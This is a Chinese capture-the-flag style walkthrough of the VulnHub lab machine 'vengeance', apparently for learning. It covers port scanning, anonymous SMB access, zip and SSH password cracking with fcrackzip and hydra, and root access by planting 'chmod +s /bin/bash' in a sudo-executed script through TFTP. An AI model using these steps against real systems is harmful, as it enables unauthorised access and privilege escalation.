# 前言

靶机：`digitalworld.local-vengeance`，IP地址为`192.168.10.10`

攻击：`kali`，IP地址为`192.168.10.6`

`kali`采用`VMware`虚拟机，靶机选择使用`VMware`打开文件，都选择桥接网络

这里官方给的有两种方式，一是直接使用`virtualbox`加载，另一种是通过`VMware`直接加载，也给出了`iso`镜像文件。	

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过网盘下载

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](pic-vengeance\1.jpg)





# 信息收集

## 使用nmap扫描端口

扫描`tcp`端口，并保存于`nmap-tcp`

```shell
nmap -sT 192.168.10.10 --min-rate=1000 -p- -oA nmap-tcp
```

![](pic-vengeance\2.jpg)

扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少

```shell
nmap -sU 192.168.10.10 --top-ports 20 -T4 -oA nmap-udp
```

![](pic-vengeance\3.jpg)

把前面扫描出的`tcp`端口，进行处理，只取端口号

```shell
grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
#这里就是包括可能开放的端口都不要，因为是靶机，可能过滤的话，也会无法进一步扫描
ports=80,180,110,113,139,143,443,445,993,995,22222
```

![](pic-vengeance\4.jpg)

对特定的端口号进行深入探测

```shell
nmap -sV -O -sC -sT 192.168.10.10 -p $ports -oA detail
```

![](pic-vengeance\5.jpg)

![6](pic-vengeance\6.jpg)

使用脚本检测有无漏洞

```shell
nmap --script=vuln 192.168.10.10 -p $ports -oA vuln
```

![](pic-vengeance\7.jpg)

![8](pic-vengeance\8.jpg)

## smb探测

使用`nmap`的脚本进行测试，不过脚本并没有启动成功

```shell
nmap --script=smb* 192.168.10.10
```

使用`enum4linux`进行枚举，发现内容

![](pic-vengeance\9.jpg)

![10](pic-vengeance\10.jpg)

尝试使用`smbclient`连接，最终以匿名身份连接到`sarapublic`分享时，发现内容

```shell
smbclient //192.168.10.10/sarapublic$ -N
```

![](pic-vengeance\11.jpg)

然后把所以数据下载

```shell
smb: \> prompt
smb: \> recurse
smb: \> mget *
```

这个似乎是工作目录，查看`essay.txt`，发现其中的信息，包括产品，以及两个人名`qinyi、govindasamy`

![](pic-vengeance\12.jpg)

查看`profile.txt`文件，发现一个人名`giovanni`

![](pic-vengeance\13.jpg)

尝试解压`gio.zip`，发现需要密码

![](pic-vengeance\14.jpg)

尝试使用`fcrackzip`进行爆破，发现字典`rockyou.txt`也没获取密码

```shell
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt gio.zip
```



查看`champagne`目录，看到一个网站的目录，猜测这个可能是网站的备份文件之类的

![](pic-vengeance\15.jpg)

## 网站探测

访问80端口的网站

![](pic-vengeance\16.jpg)

结合前面`nmap`的扫描，应该是一个`wordpress`的CMS，这个界面，估计是靶机需要绑定域名

点击一个链接，发现是跳转到一个域名`vengeance.goodtech.inc`，这个域名就是需要进行绑定的

![](pic-vengeance\17.jpg)

在`windows`和`linux`中绑定域名，需要编辑`hosts`文件，只是文件的位置不同

```shell
linux 在 /etc/hosts文件
windos在 C:\Windows\System32\Drivers\etc\hosts文件
```

![](pic-vengeance\17-1.jpg)

绑定后即可正常访问了

![](pic-vengeance\18.jpg)

使用`whatweb`探测网站信息

```shell
whatweb http://192.168.10.10
```

![](pic-vengeance\19.jpg)

使用浏览器的插件`wappalyzer`查看网站相关使用

![](pic-vengeance\20.jpg)

使用针对`wordpress`这个CMS的专门工具`wpscan`

```shell
wpscan --url http://vengeance.goodtech.inc -e u
```

获取到`wordpress`的版本信息`5.6.1`

![](pic-vengeance\21.jpg)

枚举到三个用户`qinyi、sara、qiu`

![](pic-vengeance\22.jpg)

尝试进行爆破密码，但是这里未找到接口，大概率是目录名称更换了，所以采用目录爆破一下

使用`gobuster`进行爆破，也是没有好的数据

```shell
gobuster dir -u http://192.168.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,s,.,.html -b 403-404
```

![](pic-vengeance\23.jpg)

仔细的去看看这个网站，发现这个网站是用户`qinyi`的博客，记录了她的一些事件

![](pic-vengeance\24.jpg)

访问其中一个文章，发现一个需要密码的界面

![](pic-vengeance\25.jpg)

唉，这个网站中还有一些其他文章，可以去自己看看，评论也有。爱情啊

但是到这里又断了

# 压缩包破解

之前在`smb`获取的信息，应该有大用才对，回去继续测试

尝试从80端口的网站使用`cewl`获取单词，但是，获取到的东西并不能破解。

那么既然压缩包`gio.zip`中，有一些其他的`txt`文件，那么是否这里面的单词有可能会有密码

```shell
grep -oE '\w+' blurb.txt| sort | uniq > pass.txt
grep -oE '\w+' eaurouge | sort | uniq >> pass.txt
grep -oE '\w+' eaurouge.txt| sort | uniq >> pass.txt
grep -oE '\w+' essay.txt| sort | uniq >> pass.txt
grep -oE '\w+' profile.txt| sort | uniq >> pass.txt
```

然后使用`fcrackzip`进行破解

```shell
fcrackzip -u -D -p pass.txt gio.zip
```

获取到密码`nanotechnological`

![](pic-vengeance\26.jpg)

到了这里我变得很敏感了，查看文件`pass_reminder.txt`，发现字段

![](pic-vengeance\27.jpg)

查看`pptx`文件，五张幻灯片，有很多文字

![](pic-vengeance\28.jpg)

我现在把`ppt`中的文字都放在一个文件中，并通过`grep`等命令分割单词，然后作为字典

![](pic-vengeance\29.jpg)



这里做成的字典，可以作为网站的密码破解，或者是对`ssh`登录进行爆破

# ssh爆破

之前使用`wpscan`或者`smb`枚举时，有些用户的，把这些用户放在一个文件中

```shell
hydra 192.168.10.10 -L user.txt -P pass.txt ssh -s 22222
```

但是爆破后，并没有反应，突然想到解压后的一个文件名`pass_reminder`，密码提醒

![](pic-vengeance\30.jpg)

文件内容，是密码构成

```
name	---->名称
corner	---->拐角，角
circuit	---->电路
```

再次查看`ppt`，毕竟图片没有内容了，这个`ppt`的作者名称`Giovanni Berlusconi`

![](pic-vengeance\31.jpg)

另一种`ppt`，说的是`corner`，就是角

![](pic-vengeance\32.jpg)

搜索一下这个图片的出处，因为这里说了最喜欢的弯道，但是没给出具体名称

![](pic-vengeance\33.jpg)

`ok`，知道了，就构造密码

```shell
name 	--->Giovanni Berlusconi
corner	--->130R
circuit	--->Suzuka
```

编写一个`bash`脚本即可

```shell
for name in giovanni berlusconi Giovanni Berlusconi "Giovanni Berlusconi"; do
    printf "%s_130R_Suzuka\n" "$name"
done > pass.txt
```

![](pic-vengeance\34.jpg)

使用`hydra`进行爆破

```shell
hydra 192.168.10.10 -L user.txt -P pass.txt ssh -s 22222
```

![](pic-vengeance\35.jpg)

以这个账户密码`giovanni_130R_Suzuka`连接`ssh`

```shell
ssh qinyi@192.168.10.10 -p 22222
```

![](pic-vengeance\36.jpg)

# 靶机内信息收集

登录`qinyi`的账户后，查看当前目录下的提示

![](pic-vengeance\37.jpg)

这里看到有`sara、patrick`两个人名，并且可能有些东西修改了，有些还没来得及

查看有哪些用户

```shell
ls -alh /home
cat /etc/passwd | grep /bin/bash
```

![](pic-vengeance\38.jpg)

收集内核版本和系统版本

```shell
uname -a/-r
cat /etc/issue
cat /etc/*release
lsb_release
```

![](pic-vengeance\39.jpg)

查看其他用户具有写权限的文件，发现并没有

```shell
find / -type f -perm /o+w 2>/dev/null | grep -v /sys | grep -v /proc
```

获取以`root`执行的进程

```shell
ps aux | grep root
```

![](pic-vengeance\40.jpg)

查看连接状态等信息，没什么值得关注

```shell
ip add
ss -antlp
netstat -antlp
```

查看定时任务

```shell
crontab -l
cat /etc/crontab
atq
```

![](pic-vengeance\41.jpg)

上传`pspy64`，然后进行测试，看有无隐藏执行的进程

在`kali`中执行`scp`上传到靶机

```shell
scp -P 22222 ./pspy64 qinyi@192.168.10.10:/tmp
```

不过执行后，还是没有东西

再通过`kali`的`scp`上传`linpeas.sh`

```shell
scp -P 22222 ./linpeas.sh qinyi@192.168.10.10:/tmp
```

东西太多，大致都差不多

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](pic-vengeance\42.jpg)

使用`sudo -l`查看

![](pic-vengeance\43.jpg)



虽然`nginx`可以重启，但是前面寻找可以编辑的文件时，`nginx`的配置文件并不能修改，那么就无作用

另一个是在`/home/sara`目录，也就是`sara`用户的家目录下

查看文件夹，没有权限去查看或执行

![](pic-vengeance\44.jpg)

# 提权

我这里测试很久，并没有找到方式，内核也测试过了

网上看了一下`wp`，啧，我真的蠢死

这里就是端口的问题了，但是我只看了`tcp`端口，`udp`端口没看，导致错过关键信息

```shell
netstat -antulp
ss -antulp
```

![](pic-vengeance\45.jpg)

查看的网络连接状态，其实`tcp`端口基本上都是`nmap`扫描出的

对于`udp`即使扫描出了，我也没怎么关注，所以这是错误的

对扫描的结果进行处理，保留端口号

```shell
ss -antulp | grep udp | awk -F ':' '{print $2}' | awk -F ' ' '{print $1}'| uniq | paste -sd ','
```

![](pic-vengeance\46.jpg)

然后在`kali`中，再次对这些端口进行扫描

```shell
nmap -sV -sU 192.168.10.10 -p53,68,69,137,138
```

![](pic-vengeance\47.jpg)

这几个里面，可能只有`tftp`是有用的，因为这个就是和`ftp`是一样的，直接连接测试，是否被过滤或者说被拦截

```shell
tftp 192.168.10.10 69
```

可以连接成功，但是并不知道路径，连接后，也不能使用`pwd`

并且`put`上传文件后，在靶机使用`find`也无法找到上传的文件的去向

使用`lsof`测试`tftp`

```shell
lsof | tftp 
```

![](pic-vengeance\48.jpg)

这里知道，是通过`apt`安装的`tftp`，那么就可以搜索`apt`安装`tftp`的默认配置文件等情况

![](pic-vengeance\49.jpg)

查看这个配置文件，确定靶机的`tftp`的根目录是什么

![](pic-vengeance\50.jpg)

哈哈哈哈哈哈哈哈哈，与`sudo`的一个文件一样，并且用户名是`root`。那么直接尝试进行`get`，下载后查看这个文件

![](pic-vengeance\51.jpg)

直接在文件后面添加代码，以最简单的

```shell
chmod +s /bin/bash
```

![](pic-vengeance\52.jpg)

再次把这个文件上传，不过名称一定要一样，不要修改，直接`put`

![](pic-vengeance\53.jpg)

可以看到`/bin/bash`已经有了SUID权限

直接提权

```shell
/bin/bash -p
```

![](pic-vengeance\54.jpg)

# 总结

这个靶机其实主要就是密码的猜测

该靶机值得反思以下几点：

1. 对于网站，并非一定是突破口
2. `smb`匿名登录获取分享中的数据，主要就是围绕一个压缩包，其中的`txt`文件都是作为其密码的根据，这个我没想到，网站我想到了，但是这个是真的没想到，所以思维要广
3. 对于压缩包的破解后，获取到的文件，一定有用的，所以不要放弃，这里是给出了提示，所以排列组合少了很多，若没有提示呢，啧
4. 靶机内的信息收集一定要全面，我这里忽略了`udp`端口在靶机的监听状态，导致漏掉了`tftp`
5. 提权，这里还是`sudo`，主要就是发现`tftp`，以及`tftp`的根目录，不然这个靶机也是无法提权的

其实，到最后，我好奇的还是网站的哪个需要密码的东西，到底是什么，我后面会去观看的

最终还是通过数据库找到了，密码没找到

原来这是感情经历，怪不得密码封印

![](pic-vengeance\55.jpg)











